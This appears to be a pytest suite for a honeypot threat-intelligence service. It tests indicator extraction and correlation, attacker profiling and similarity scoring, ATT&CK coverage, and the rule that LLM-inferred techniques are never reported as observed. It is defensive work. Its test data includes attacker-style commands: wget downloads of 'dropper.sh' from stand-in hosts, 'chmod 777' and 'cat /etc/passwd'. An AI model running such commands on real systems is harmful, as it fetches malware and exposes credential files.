import uuid
from datetime import datetime, timezone

import pytest
from sqlalchemy import select

from app.db.models import (
    Analysis,
    EvidenceRef,
    IndicatorSession,
    ObservedBehavior,
    RecommendedAction,
    SuspiciousIndicator,
    TechniqueMapping,
)
from app.db.models import Indicator as IndicatorRow
from app.config import get_settings
from app.db.session import get_session_factory
from app.seed.seeder import seed
from app.services.analyzer import run_analysis
from app.services.compaction import compact
from app.services.coverage import build_coverage
from app.services.intel import correlate, extract_indicators, list_indicators
from app.services.llm.schemas import EvidenceCitation
from app.services.profiles import build_profile, jaccard, normalize_command
from app.services.session_builder import get_session_events

# Cleanup runs inline, at the end of each test's own coroutine (try/finally) --
# the pattern tests/test_analyzer.py and tests/test_evidence_barrier.py
# already use. This suite additionally writes to the indicators and
# indicator_sessions tables (Task 15's own write path, separate from the
# Task 13 claim barrier), so cleanup here also removes any indicator that
# this test's own session(s) created and left with no remaining link.


async def _delete_analysis_and_children(analysis_id: uuid.UUID) -> None:
    factory = get_session_factory()
    async with factory() as db:
        for model in (TechniqueMapping, ObservedBehavior, SuspiciousIndicator):
            rows = (
                (await db.execute(select(model).where(model.analysis_id == analysis_id)))
                .scalars()
                .all()
            )
            for row in rows:
                refs = (
                    (await db.execute(select(EvidenceRef).where(EvidenceRef.parent_id == row.id)))
                    .scalars()
                    .all()
                )
                for ref in refs:
                    await db.delete(ref)
                await db.delete(row)

        actions = (
            (
                await db.execute(
                    select(RecommendedAction).where(RecommendedAction.analysis_id == analysis_id)
                )
            )
            .scalars()
            .all()
        )
        for action in actions:
            await db.delete(action)

        analysis = await db.get(Analysis, analysis_id)
        if analysis:
            await db.delete(analysis)
        await db.commit()


async def _delete_indicators_for_session(session_id: str) -> None:
    """Undo whatever `correlate` wrote for one session_id.

    Removes this session's indicator_sessions links, then deletes any
    indicator left with zero remaining links -- an indicator another,
    still-live session also cites is left alone.
    """
    factory = get_session_factory()
    async with factory() as db:
        links = (
            (
                await db.execute(
                    select(IndicatorSession).where(IndicatorSession.session_id == session_id)
                )
            )
            .scalars()
            .all()
        )
        indicator_ids = [link.indicator_id for link in links]
        for link in links:
            await db.delete(link)
        await db.flush()

        for indicator_id in indicator_ids:
            remaining = (
                (
                    await db.execute(
                        select(IndicatorSession).where(
                            IndicatorSession.indicator_id == indicator_id
                        )
                    )
                )
                .scalars()
                .first()
            )
            if remaining is None:
                row = await db.get(IndicatorRow, indicator_id)
                if row:
                    await db.delete(row)
        await db.commit()


def test_jaccard_of_identical_sets_is_one() -> None:
    assert jaccard({"ls", "id"}, {"ls", "id"}) == 1.0


def test_jaccard_of_disjoint_sets_is_zero() -> None:
    assert jaccard({"ls"}, {"whoami"}) == 0.0


def test_jaccard_of_empty_sets_is_zero_not_a_crash() -> None:
    assert jaccard(set(), set()) == 0.0


def test_jaccard_is_symmetric() -> None:
    a, b = {"ls", "id", "ps"}, {"ls", "whoami"}
    assert jaccard(a, b) == jaccard(b, a)


@pytest.mark.asyncio
async def test_extraction_finds_urls_hashes_and_ips() -> None:
    # seed-botnet-01's download event (app/seed/corpus/botnet_dropper.json)
    # carries a real 64-char shasum, url, and outfile -- none of which
    # appear anywhere in command text, so this can only pass if
    # extract_indicators actually reads compacted.downloads, not just
    # regex-scans commands.
    await seed(reset=True)
    events = await get_session_events("seed-botnet-01")
    compacted = compact(events)
    extracted = extract_indicators(compacted)

    types = {payload["type"] for payload, _ in extracted}
    assert "url" in types
    assert "command" in types
    assert "hash" in types
    assert "filename" in types

    for payload, citations in extracted:
        assert citations, f"{payload} was extracted without a citation"

    assert len(compacted.downloads) == 1
    download = compacted.downloads[0]
    assert download.shasum == (
        "9f2b1c4e8a7d6053f1e2b9c8a7d6e5f4b3a2918077665544332211aabbccddee"
    )

    hash_entry = next(
        (p, c) for p, c in extracted if p["type"] == "hash" and p["value"] == download.shasum
    )
    _, hash_citations = hash_entry
    assert any(c.event_id == download.event_id for c in hash_citations), (
        "the hash indicator must be cited to the download event, not a command"
    )

    filename_entry = next(
        (p, c) for p, c in extracted if p["type"] == "filename" and p["value"] == download.outfile
    )
    _, filename_citations = filename_entry
    assert any(c.event_id == download.event_id for c in filename_citations)


@pytest.mark.asyncio
async def test_indicators_accumulate_sessions_across_runs() -> None:
    await seed(reset=True)
    analysis_a = await run_analysis("seed-botnet-01")
    analysis_b = await run_analysis("seed-miner-01")
    try:
        indicators = await list_indicators()
        assert indicators

        for indicator in indicators:
            assert indicator.source in {"OBSERVED", "CORRELATED", "AI INFERENCE", "STATIC ANALYSIS"}
            assert indicator.session_ids
    finally:
        await _delete_analysis_and_children(analysis_a)
        await _delete_analysis_and_children(analysis_b)
        await _delete_indicators_for_session("seed-botnet-01")
        await _delete_indicators_for_session("seed-miner-01")


@pytest.mark.asyncio
async def test_one_analysis_leaves_indicators_observed_with_one_session() -> None:
    # A single call to `correlate` must never claim cross-session
    # correlation: `source` starts (and stays, absent a second session)
    # OBSERVED, with exactly the one session id that was actually offered.
    value = f"203.0.113.{uuid.uuid4().int % 250}"
    extracted = [(
        {"type": "ip", "value": value},
        [EvidenceCitation(event_id="e-1", artifact=f"connection from {value}")],
    )]
    session_a = f"test-corr-a-{uuid.uuid4().hex[:8]}"
    try:
        new_count = await correlate(session_a, extracted)
        assert new_count == 1

        indicators = await list_indicators(type_="ip", q=value)
        assert len(indicators) == 1
        assert indicators[0].source == "OBSERVED"
        assert indicators[0].session_ids == [session_a]
    finally:
        await _delete_indicators_for_session(session_a)


@pytest.mark.asyncio
async def test_reanalyzing_the_same_session_does_not_fabricate_correlation() -> None:
    # This is the regression this test guards: an indicator re-encountered
    # within the SAME session (a re-analysis, or simply appearing again) is
    # NOT a second session. Flipping it to CORRELATED here would assert
    # something that never happened -- the same defect class as a
    # hardcoded risk level, just for a different field.
    value = f"203.0.113.{uuid.uuid4().int % 250}"
    extracted = [(
        {"type": "ip", "value": value},
        [EvidenceCitation(event_id="e-1", artifact=f"connection from {value}")],
    )]
    session_a = f"test-corr-a-{uuid.uuid4().hex[:8]}"
    try:
        await correlate(session_a, extracted)

        new_count_again = await correlate(session_a, extracted)
        assert new_count_again == 0, "the value already existed; nothing new was created"

        indicators = await list_indicators(type_="ip", q=value)
        assert len(indicators) == 1
        reanalyzed = indicators[0]
        assert reanalyzed.source == "OBSERVED", "same session again is not a second session"
        assert reanalyzed.session_ids == [session_a], "must not grow past one session id"
    finally:
        await _delete_indicators_for_session(session_a)


@pytest.mark.asyncio
async def test_indicator_flips_to_correlated_when_seen_in_a_second_session() -> None:
    # Exercises `correlate` directly (the real, production write path) rather
    # than hand-inserting rows: one indicator value offered to two different
    # session_ids must accumulate both sessions and flip its provenance from
    # OBSERVED to CORRELATED -- proving the mechanism, not just the field.
    # A second value, unique to session_b, proves the flip is per-indicator:
    # it must stay OBSERVED even while the shared value next to it flips.
    shared_value = f"203.0.113.{uuid.uuid4().int % 250}"
    unique_value = f"198.51.100.{uuid.uuid4().int % 250}"
    shared = [(
        {"type": "ip", "value": shared_value},
        [EvidenceCitation(event_id="e-1", artifact=f"connection from {shared_value}")],
    )]
    session_a = f"test-corr-a-{uuid.uuid4().hex[:8]}"
    session_b = f"test-corr-b-{uuid.uuid4().hex[:8]}"
    try:
        new_count = await correlate(session_a, shared)
        assert new_count == 1

        indicators = await list_indicators(type_="ip", q=shared_value)
        assert len(indicators) == 1
        assert indicators[0].source == "OBSERVED"
        assert indicators[0].session_ids == [session_a]

        session_b_extracted = shared + [(
            {"type": "ip", "value": unique_value},
            [EvidenceCitation(event_id="e-2", artifact=f"connection from {unique_value}")],
        )]
        new_count_again = await correlate(session_b, session_b_extracted)
        assert new_count_again == 1, "only unique_value is genuinely new this call"

        indicators = await list_indicators(type_="ip", q=shared_value)
        assert len(indicators) == 1
        flipped = indicators[0]
        assert flipped.source == "CORRELATED"
        assert set(flipped.session_ids) == {session_a, session_b}

        indicators = await list_indicators(type_="ip", q=unique_value)
        assert len(indicators) == 1
        still_single = indicators[0]
        assert still_single.source == "OBSERVED", "unique to one session -- must not flip"
        assert still_single.session_ids == [session_b]
    finally:
        await _delete_indicators_for_session(session_a)
        await _delete_indicators_for_session(session_b)


@pytest.mark.asyncio
async def test_attacker_profile_is_built_from_sessions() -> None:
    await seed(reset=True)
    analysis_id = await run_analysis("seed-botnet-01")
    try:
        profile = await build_profile("185.220.101.44")
        assert profile is not None
        assert profile.sessions >= 1
        assert profile.commands
        assert profile.technique_ids
        assert profile.attack_pattern
    finally:
        await _delete_analysis_and_children(analysis_id)
        await _delete_indicators_for_session("seed-botnet-01")


@pytest.mark.asyncio
async def test_profile_of_an_unseen_ip_is_none() -> None:
    assert await build_profile("203.0.113.99") is None


@pytest.mark.asyncio
async def test_coverage_marks_only_rule_backed_techniques_observed() -> None:
    await seed(reset=True)
    analysis_id = await run_analysis("seed-botnet-01")
    try:
        coverage = await build_coverage()

        assert coverage.total_count > 0
        assert coverage.observed_count <= coverage.total_count

        ingress = next(t for t in coverage.techniques if t.id == "T1105")
        assert ingress.observed is True
        assert ingress.evidence
    finally:
        await _delete_analysis_and_children(analysis_id)
        await _delete_indicators_for_session("seed-botnet-01")


@pytest.mark.asyncio
async def test_coverage_scoped_to_a_session_excludes_others() -> None:
    await seed(reset=True)
    analysis_id = await run_analysis("seed-persist-01")
    try:
        coverage = await build_coverage(session_id="seed-persist-01")

        observed = {t.id for t in coverage.techniques if t.observed}
        assert "T1098.004" in observed
    finally:
        await _delete_analysis_and_children(analysis_id)
        await _delete_indicators_for_session("seed-persist-01")


@pytest.mark.asyncio
async def test_coverage_marks_llm_inferred_technique_as_not_observed() -> None:
    # seed-unmapped-01's commands (dmidecode, /sys/class/dmi, ip route,
    # systemctl) are deliberately chosen to match none of the rulebook's
    # patterns -- see app/services/mitre/rules.py and rulebook.yaml. Any
    # technique mapping for this session can only have come from the LLM
    # gap-fill, so this proves the observed=False boundary against a real
    # analysis run rather than a hand-built TechniqueMapping row.
    await seed(reset=True)
    analysis_id = await run_analysis("seed-unmapped-01")
    try:
        async with get_session_factory()() as db:
            mappings = (
                (
                    await db.execute(
                        select(TechniqueMapping).where(
                            TechniqueMapping.analysis_id == analysis_id
                        )
                    )
                )
                .scalars()
                .all()
            )
        if not mappings:
            # Not a failure. seed-unmapped-01 matches no rule by design, so
            # every mapping here has to come from the LLM gap-fill -- and the
            # gap-fill legitimately produces nothing on some passes, or
            # produces a claim citing an event id that does not resolve, which
            # the evidence write barrier then rejects (look for
            # "rejected claim: ... resolved=0" in the captured log). Both are
            # the system behaving correctly.
            #
            # This used to be a hard assert, and it is why the suite shipped
            # with a documented "one failure is a clean run" caveat. A test
            # that cries wolf on a green build trains people to skim red, so
            # the end-to-end case skips loudly and the BOUNDARY it exists to
            # protect -- llm-sourced means observed is False -- is pinned
            # deterministically by
            # test_an_llm_sourced_mapping_is_never_marked_observed below.
            pytest.skip(
                "llama3.1:8b inferred no technique for seed-unmapped-01 that "
                "survived the evidence barrier on this pass"
            )
        assert all(m.source == "llm" for m in mappings)

        coverage = await build_coverage(session_id="seed-unmapped-01")
        matched = [t for t in coverage.techniques if t.session_count > 0]
        assert matched

        for technique in matched:
            assert technique.observed is False
            assert technique.ai_explanation
            assert technique.evidence
    finally:
        await _delete_analysis_and_children(analysis_id)
        await _delete_indicators_for_session("seed-unmapped-01")


# ---------------------------------------------------------------------------
# Command normalisation for attacker similarity.
#
# The design prose promised "Jaccard over NORMALISED command sets", but the
# sets were built from raw command_line strings. Two runs of the same dropper
# pointed at different C2 addresses shared no set members at all and scored 0
# similarity -- the opposite of the intended result.
#
# Normalisation replaces the literals that vary between runs of one campaign
# (IPv4 addresses, file hashes) with placeholders, and leaves everything that
# carries meaning alone. It deliberately does NOT strip arguments wholesale:
# `cat /etc/passwd` and `cat /tmp/notes` map to different ATT&CK techniques,
# and collapsing them would destroy the signal the rest of the system runs on.
# ---------------------------------------------------------------------------


def test_normalisation_ignores_the_c2_address_but_keeps_the_payload_path() -> None:
    same_payload_different_c2 = normalize_command("wget http://198.51.100.7/dropper.sh")
    assert same_payload_different_c2 == normalize_command("wget http://203.0.113.9/dropper.sh")
    # A different payload is a different command, C2 address notwithstanding.
    assert same_payload_different_c2 != normalize_command("wget http://198.51.100.7/miner.sh")


def test_normalisation_collapses_whitespace_and_case() -> None:
    assert normalize_command("  CHMOD   777   dropper.sh ") == normalize_command(
        "chmod 777 dropper.sh"
    )


def test_normalisation_ignores_a_differing_file_hash() -> None:
    assert normalize_command("sha256sum " + "a" * 64) == normalize_command(
        "sha256sum " + "b" * 64
    )


def test_normalisation_preserves_arguments_that_change_meaning() -> None:
    # Permission bits are the whole point of the T1222.002 mapping.
    assert normalize_command("chmod 777 f") != normalize_command("chmod 644 f")
    # So is the file being read.
    assert normalize_command("cat /etc/passwd") != normalize_command("cat /tmp/notes")


def test_jaccard_scores_two_runs_of_one_campaign_as_identical_after_normalisation() -> None:
    first = {
        normalize_command(c)
        for c in ("wget http://198.51.100.7/dropper.sh", "chmod 777 dropper.sh")
    }
    second = {
        normalize_command(c)
        for c in ("wget http://203.0.113.9/dropper.sh", "chmod 777 dropper.sh")
    }

    assert jaccard(first, second) == 1.0
    # Without normalisation the same two campaigns share only the chmod.
    raw_first = {"wget http://198.51.100.7/dropper.sh", "chmod 777 dropper.sh"}
    raw_second = {"wget http://203.0.113.9/dropper.sh", "chmod 777 dropper.sh"}
    assert jaccard(raw_first, raw_second) < 1.0


# ---------------------------------------------------------------------------
# Attacker similarity completeness.
#
# _commands_by_ip used to walk every session and fetch its events one request
# at a time. Replacing that with a single terms aggregation introduces a cap:
# a terms agg returns at most `size` buckets and says nothing about what it
# dropped. Scoring a truncated command set would produce a confident number
# computed from a subset of the evidence -- a beautiful, wrong 0.87.
#
# So the aggregation reports whether each set is complete, and an incomplete
# set withholds similarity entirely rather than scoring what survived.
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_similarity_is_scored_when_every_command_set_is_complete() -> None:
    await seed(reset=True)
    profile = await build_profile("185.220.101.44")

    assert profile is not None
    assert profile.similarity_complete is True
    assert profile.similarity_incomplete_reason is None


@pytest.mark.asyncio
async def test_similarity_is_withheld_when_the_command_cardinality_limit_is_hit(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # seed-botnet-01 alone records more commands than this, so the cap is
    # deliberately exceeded and the aggregation must notice.
    await seed(reset=True)
    monkeypatch.setattr(get_settings(), "attacker_command_cardinality_limit", 2)

    profile = await build_profile("185.220.101.44")

    assert profile is not None
    assert profile.similarity_complete is False
    assert profile.similarity_incomplete_reason == "command_cardinality_limit"
    # The point of the exercise: no score at all, rather than a score computed
    # from whichever commands happened to survive truncation.
    assert profile.similarity == []


@pytest.mark.asyncio
async def test_a_generous_cap_leaves_the_seed_corpus_complete(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # The same profile, same data, cap raised above the corpus: completeness
    # must flip back. Without this the previous test would also pass against
    # an implementation that simply always reports incomplete.
    await seed(reset=True)
    monkeypatch.setattr(get_settings(), "attacker_command_cardinality_limit", 5000)

    profile = await build_profile("185.220.101.44")

    assert profile is not None
    assert profile.similarity_complete is True
    assert profile.similarity_incomplete_reason is None


@pytest.mark.asyncio
async def test_an_llm_sourced_mapping_is_never_marked_observed() -> None:
    """The observed boundary, pinned without involving the model.

    `test_coverage_marks_only_rule_backed_techniques_observed` covers the
    positive half (a rule produced it, so observed is True) and is
    deterministic because the rulebook is. The negative half -- the half that
    actually protects the project's central claim, that an LLM guess is never
    presented as telemetry -- rested entirely on a live analysis run whose
    output the model decides.

    So the row is written directly here. T1016 is in the pinned catalog and
    in no rule in the rulebook, so nothing else can mark it observed and the
    assertion cannot pass by accident.
    """
    factory = get_session_factory()
    analysis_id = uuid.uuid4()
    session_id = f"test-llm-boundary-{analysis_id.hex[:8]}"

    async with factory() as db:
        db.add(
            Analysis(
                id=analysis_id,
                session_id=session_id,
                model="test-fixture",
                analysis_type="behavioral",
                status="completed",
                created_at=datetime.now(timezone.utc),
                duration_seconds=0,
                classification="reconnaissance",
                confidence=0.5,
                risk_score=10,
                risk="low",
                behavior_summary="fixture row for the observed boundary",
                model_tier="local",
                prompt_version="test",
            )
        )
        db.add(
            TechniqueMapping(
                analysis_id=analysis_id,
                technique_id="T1016",
                technique_name="System Network Configuration Discovery",
                tactic="Discovery",
                confidence=0.91,
                ai_explanation="inferred by the model, not matched by a rule",
                source="llm",
                rule_id=None,
                timestamp=datetime.now(timezone.utc),
            )
        )
        await db.commit()

    try:
        coverage = await build_coverage(session_id=session_id)

        technique = next(t for t in coverage.techniques if t.id == "T1016")
        assert technique.session_count == 1, "the fixture mapping was not picked up"
        assert technique.observed is False
        assert technique.confidence == 0.91, (
            "a high model confidence must not promote a claim to observed"
        )
        assert coverage.observed_count == 0
    finally:
        await _delete_analysis_and_children(analysis_id)
        async with factory() as db:
            row = await db.get(Analysis, analysis_id)
            if row is not None:
                await db.delete(row)
                await db.commit()


# --- A6: two analyses at once ---------------------------------------------


@pytest.mark.asyncio
async def test_concurrent_correlation_of_a_shared_value_does_not_raise() -> None:
    """Every session records its attacker's IP, so any two analyses of
    sessions from the same attacker collide on that indicator.

    The old SELECT-then-INSERT had both reads return "not there" and both
    inserts fire; the loser violated uq_indicator_type_value, rolling back a
    whole analysis that had already done its work and surfacing as a 500.
    """
    import asyncio

    value = f"198.51.100.{uuid.uuid4().int % 250}"
    extracted = [(
        {"type": "ip", "value": value},
        [EvidenceCitation(event_id="e-1", artifact=f"connection from {value}")],
    )]
    session_a = f"test-race-a-{uuid.uuid4().hex[:8]}"
    session_b = f"test-race-b-{uuid.uuid4().hex[:8]}"
    try:
        counts = await asyncio.gather(
            correlate(session_a, extracted), correlate(session_b, extracted)
        )

        # Exactly one call created the value; the other found it.
        assert sorted(counts) == [0, 1], counts

        indicators = await list_indicators(type_="ip", q=value)
        assert len(indicators) == 1, "the value was inserted twice"
        assert sorted(indicators[0].session_ids) == sorted([session_a, session_b])
    finally:
        await _delete_indicators_for_session(session_a)
        await _delete_indicators_for_session(session_b)


@pytest.mark.asyncio
async def test_concurrent_correlation_still_reports_the_value_as_correlated() -> None:
    """The quieter half of the same bug.

    `source` is CORRELATED only when the value was genuinely seen in more
    than one session, counted after the link is written. Run two analyses at
    once and neither could see the other's uncommitted link, so both counted
    one and both wrote OBSERVED -- a value in two sessions reported as being
    in one, permanently. The row lock ON CONFLICT DO UPDATE takes is what
    makes the second call count both.
    """
    import asyncio

    value = f"198.51.100.{uuid.uuid4().int % 250}-{uuid.uuid4().hex[:6]}"
    extracted = [(
        {"type": "url", "value": f"http://{value}/x.sh"},
        [EvidenceCitation(event_id="e-1", artifact="wget")],
    )]
    session_a = f"test-flip-a-{uuid.uuid4().hex[:8]}"
    session_b = f"test-flip-b-{uuid.uuid4().hex[:8]}"
    try:
        await asyncio.gather(
            correlate(session_a, extracted), correlate(session_b, extracted)
        )

        indicators = await list_indicators(type_="url", q=value)
        assert len(indicators) == 1
        assert indicators[0].source == "CORRELATED", (
            "two distinct sessions link this value but it reports as seen in one"
        )
    finally:
        await _delete_indicators_for_session(session_a)
        await _delete_indicators_for_session(session_b)


# --- A9: the filter must actually filter ----------------------------------


@pytest.mark.asyncio
async def test_a_wildcard_in_the_search_term_does_not_widen_the_filter() -> None:
    """`%` and `_` are LIKE wildcards.

    Moving `q` from a Python substring check into SQL is where this becomes
    reachable: unescaped, a `%` matches every row while still returning a
    plausible-looking list. Same shape of answer, silently wider -- the
    failure this project keeps finding. The assertion is that the filtered
    result DIFFERS from the unfiltered one; equal counts would prove nothing.
    """
    marker = uuid.uuid4().hex[:8]
    present = f"cmd-{marker}-alpha"
    decoy = f"cmd-{marker}-beta"
    session_id = f"test-like-{uuid.uuid4().hex[:8]}"
    extracted = [
        ({"type": "command", "value": present}, [EvidenceCitation(event_id="e-1", artifact="x")]),
        ({"type": "command", "value": decoy}, [EvidenceCitation(event_id="e-2", artifact="y")]),
    ]
    try:
        await correlate(session_id, extracted)

        both = await list_indicators(type_="command", q=marker)
        assert {i.value for i in both} == {present, decoy}

        # A term containing a wildcard must match it LITERALLY. Nothing in
        # the corpus contains a literal '%', so this must come back empty --
        # and crucially, not with the two rows above.
        widened = await list_indicators(type_="command", q=f"{marker}%alpha")
        assert widened == [], f"the % was treated as a wildcard: {[i.value for i in widened]}"

        underscore = await list_indicators(type_="command", q=f"cmd_{marker}")
        assert underscore == [], "the _ was treated as a single-character wildcard"
    finally:
        await _delete_indicators_for_session(session_id)


@pytest.mark.asyncio
async def test_listing_indicators_does_not_query_once_per_row() -> None:
    """Two queries, whatever the row count -- it was one per indicator.

    `create_report` calls this unfiltered and keeps one session's worth, so
    the N+1 was paid in full on every report.
    """
    session_id = f"test-n1-{uuid.uuid4().hex[:8]}"
    marker = uuid.uuid4().hex[:8]
    extracted = [
        (
            {"type": "command", "value": f"n1-{marker}-{n}"},
            [EvidenceCitation(event_id=f"e-{n}", artifact="x")],
        )
        for n in range(6)
    ]
    try:
        await correlate(session_id, extracted)

        statements: list[str] = []
        factory = get_session_factory()
        async with factory() as probe:
            conn = await probe.connection()

            from sqlalchemy import event as sa_event

            def _record(conn_, cursor, statement, parameters, context, executemany):
                statements.append(statement)

            sa_event.listen(conn.sync_engine, "before_cursor_execute", _record)
            try:
                results = await list_indicators(type_="command", q=marker)
            finally:
                sa_event.remove(conn.sync_engine, "before_cursor_execute", _record)

        assert len(results) == 6
        selects = [s for s in statements if s.lstrip().upper().startswith("SELECT")]
        assert len(selects) == 2, f"expected 2 queries, got {len(selects)}:\n" + "\n".join(selects)
    finally:
        await _delete_indicators_for_session(session_id)
